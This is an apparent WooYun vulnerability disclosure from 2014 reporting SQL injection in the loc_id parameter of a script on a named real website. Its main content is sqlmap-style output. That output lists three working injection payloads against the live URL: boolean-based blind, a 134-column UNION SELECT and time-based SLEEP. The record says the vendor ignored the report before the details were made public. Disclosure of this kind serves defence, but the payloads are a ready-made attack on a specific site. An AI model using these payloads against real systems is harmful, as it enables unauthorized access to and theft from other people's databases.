wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-01-12：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-02-26：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： SQL注入一枚 详细说明：  注入点http://www.smartshanghai.com/scripts/drivemeto.php?loc_id=-6529---Place: GETParameter: loc_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: loc_id=945 AND 3604=3604    Type: UNION query    Title: MySQL UNION query (NULL) - 134 columns    Payload: loc_id=-7168 UNION ALL SELECT 16,16,16,16,16,16,16,16,16,CONCAT(0x71656e6771,0x44525057645370545076,0x716f7a7971),16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16,16#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: loc_id=945 AND SLEEP(5)---   漏洞证明：  数据库
